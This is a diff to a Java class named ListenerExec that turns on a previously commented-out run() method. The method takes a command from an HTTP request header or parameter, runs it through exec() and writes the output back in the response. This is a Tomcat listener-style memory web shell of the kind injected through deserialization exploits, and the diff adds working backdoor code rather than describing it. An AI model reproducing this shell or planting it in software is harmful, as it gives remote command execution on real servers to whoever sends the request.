@@ -31,8 +31,8 @@ public class ListenerExec implements InvocationHandler {
         return null;
     }
 
-    private void run(Object sre) {
-    }
+//    private void run(Object sre) {
+//    }
 
     /**
      * tomcat
@@ -42,25 +42,25 @@ public class ListenerExec implements InvocationHandler {
 //        Object httpServletResponse = getFieldValue(request, "response");
 //        return httpServletResponse;
 //    }
-//    private void run(Object sre) {
-//        try {
-//            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
-//            Object header =  invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-//            Object param = invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-//            String str = null;
-//            if (header != null) {
-//                str = (String) header;
-//            } else if (param != null) {
-//                str = (String) param;
-//            }
-//            String result = exec(str);
-//            Object response = getResponse(httpServletRequest);
-//            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-//            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
-//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
-//        } catch (Exception ignored) {
-//        }
-//    }
+    private void run(Object sre) {
+        try {
+            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
+            Object header =  invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+            Object param = invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+            String str = null;
+            if (header != null) {
+                str = (String) header;
+            } else if (param != null) {
+                str = (String) param;
+            }
+            String result = exec(str);
+            Object response = getResponse(httpServletRequest);
+            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
+        } catch (Exception ignored) {
+        }
+    }
     public static String exec(String str) throws Exception {
         String[] cmd;
         if (System.getProperty("os.name").toLowerCase().contains("win")) {
